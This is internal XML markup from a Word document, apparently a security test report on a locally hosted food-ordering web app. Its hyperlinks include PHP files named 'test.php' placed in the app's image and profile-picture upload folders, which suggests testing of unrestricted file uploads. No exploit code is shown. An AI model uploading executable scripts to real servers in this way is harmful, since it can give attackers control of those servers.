    <w:rsid w:val="00D27DB4"/>
    <w:rsid w:val="00D328B6"/>
    <w:rsid w:val="00D50E49"/>
    <w:rsid w:val="00D956CB"/>
    <w:rsid w:val="00DE4483"/>
    <w:rsid w:val="00E14D4B"/>
    <w:rsid w:val="00E30ADA"/>
    <w:rsid w:val="00E45B49"/>
    <w:rsid w:val="00EA57A5"/>
    <w:rsid w:val="00EE6B0D"/>
    <w:rsid w:val="00F02E9C"/>
    <w:rsid w:val="00F1389F"/>
    <w:rsid w:val="00F44B43"/>
    <w:rsid w:val="00F86F2E"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FD2D0C"/>
    <w:rsid w:val="00FE34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253594"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{A3BB152D-B22C-481F-9711-0C5BBD667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E9C"/>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DzTablo1">
    <w:name w:val="Plain Table 1"/>
    <w:basedOn w:val="NormalTablo"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="0065337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KlavuzTablo1Ak-Vurgu6">
    <w:name w:val="Grid Table 1 Light Accent 6"/>
    <w:basedOn w:val="NormalTablo"/>
    <w:uiPriority w:val="46"/>
    <w:rsid w:val="00653376"/>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styleId="Kpr">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00224837"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:styleId="ListeTablo4-Vurgu6">
    <w:name w:val="List Table 4 Accent 6"/>
    <w:basedOn w:val="NormalTablo"/>
    <w:uiPriority w:val="49"/>
    <w:rsid w:val="00224837"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
      <w:lang w:val="tr-TR"/>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zmlenmeyenBahsetme">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="VarsaylanParagrafYazTipi"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00EE6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184059">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="292373021">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="428939317">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="775095327">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="884878143">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1162505449">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1234318564">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1402674755">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1432703708">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1633755526">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1674143703">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="17989121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127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_food_search.php" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_restaurants.php" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/company_foods.php" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_cart.php" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_profile.php" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/numbering" Target="numbering.xml"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/uploads/restaurant_images/66fee861dc801_test.php" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/uploads/food_images/66ffc9e65e6d4_test.php" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/company_edit_restaurant.php?id=1" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/company_add_coupon.php" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image11.png"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_cart.php"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127.0.0.1/company_add_food.php" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/uploads/profile_pictures/66fee6c82b28b_test.php" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/uploads/food_images/66fee8b7bec0b_test.php" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.png"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/uploads/restaurant_images/66fee861dc801_test.php" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/company_coupons.php" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_cart.php" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId51"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hyperlink" Target="http://127.0.0.1/company_add_restaurant.php" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/company_edit_food.php?id=2" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/coupon_add.php" TargetMode="External"/><Relationship Id="rId54"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127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_restaurants.php" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/customer_food_search.php" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/login.php" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://127.0.0.1/logi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23</Pages>
  <Words>4245</Words>
  <Characters>24197</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>201</Lines>
  <Paragraphs>56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28386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BATURAY İ. 212803065</cp:lastModifiedBy>
  <cp:revision>46</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-10-04T18:59:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>